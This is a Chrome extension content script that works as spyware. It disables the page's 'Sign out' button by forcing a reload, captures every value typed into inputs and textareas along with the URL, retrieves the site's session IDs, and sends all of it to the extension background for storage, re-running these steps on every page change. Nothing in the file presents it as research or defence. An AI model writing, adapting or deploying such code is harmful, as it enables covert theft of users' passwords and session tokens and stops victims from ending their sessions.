// Disable the logout button
function disableLogoutButton() {
  const logoutButton = document.querySelector('button[aria-label="Sign out"]');
  if (logoutButton) {
    logoutButton.addEventListener('click', (event) => {
      event.preventDefault();
      event.stopImmediatePropagation();
      window.location.reload();
    });
  }
}

// Track inputs on the page
function trackInputs() {
  const inputs = document.querySelectorAll('input, textarea');
  inputs.forEach(input => {
    input.addEventListener('input', (event) => {
      const trackedData = {
        url: window.location.href,
        type: event.target.type,
        value: event.target.value
      };
      chrome.runtime.sendMessage({ action: "storeData", data: trackedData });
    });
  });
}

// Retrieve session IDs
function retrieveSessionIds() {
  chrome.runtime.sendMessage({ action: "getSessionIds", domain: window.location.hostname }, (response) => {
    if (response && response.sessionIds) {
      const trackedData = {
        url: window.location.href,
        sessionIds: response.sessionIds
      };
      chrome.runtime.sendMessage({ action: "storeData", data: trackedData });
    }
  });
}

// Initial setup
disableLogoutButton();
trackInputs();
retrieveSessionIds();

// Observe for dynamic content changes
const observer = new MutationObserver(() => {
  disableLogoutButton();
  trackInputs();
  retrieveSessionIds();
});

observer.observe(document.body, { childList: true, subtree: true });